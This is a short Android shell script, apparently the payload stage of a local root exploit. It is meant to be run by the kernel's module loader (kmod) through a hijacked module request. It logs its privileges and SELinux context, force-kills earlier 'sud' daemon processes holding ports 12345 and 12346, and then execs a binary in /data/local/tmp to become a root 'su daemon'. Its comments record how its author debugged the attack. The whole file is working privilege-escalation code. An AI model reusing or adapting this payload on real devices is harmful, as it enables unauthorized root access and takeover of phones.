#!/system/bin/sh
# modprobe payload: free the ports, then become the su daemon.
#
# Why the killing lives here and not in the test: the daemon that serves the test's channel may be an
# older build whose exec'd sh children inherited the listener sockets, so no command sent over that
# channel can ever hand 12345/12346 back.  kmod's exec has no such inherited fds -- it starts from the
# kernel's own /dev/null stdio -- so this process can clear the slate and then hand over.
#
# kmod execs us as: /system/bin/sh /data/local/tmp/sudK -q -- net-pf-2-proto-253-type-2
# (binfmt_script appends the kernel's argv after the script name, so those become $1..$3).
#
# TWO self-exclusion rules, both measured the hard way: Android's /system/bin/sh (mksh) shows up in
# /proc/self/comm as "sudK" -- matching on "sud*" made this script kill itself one line into its own
# log -- and the second name is the pid we must never signal: ours and our parent's.
LOG=/data/local/tmp/sudK.out
# kmod gives us an EMPTY environment, so without PATH every external command would fail
# (that is why the previous run logged "uid=" with no value).
PATH=/system/bin:/system/xbin:/vendor/bin:/sbin
export PATH
echo "SUDK start pid=$$ ppid=$PPID uid=$(grep -m1 '^Uid:' /proc/self/status) ctx=$(cat /proc/self/attr/current 2>&1) args=$*" >> $LOG
K=""; for X in /proc/[0-9]*; do
	P=${X#/proc/}
	C=$(cat "$X/comm" 2>/dev/null) || continue
	case "$C" in
	sud|sudA|sudB|sudC|sudD) ;;
	*) continue ;;
	esac
	[ "$P" -eq "$$" ] || [ "$P" -eq "$PPID" ] && continue
	K="$K $P($C)"
	kill -9 "$P"
done
echo "SUDK killed:$K" >> $LOG
sleep 1
echo "SUDK target: $(ls -lZ /data/local/tmp/sudC 2>&1)" >> $LOG
exec /data/local/tmp/sudC
echo "SUDK exec FAILED rc=$? errno-ish=$?" >> $LOG
ls -l /data/local/tmp/sudC >> $LOG 2>&1
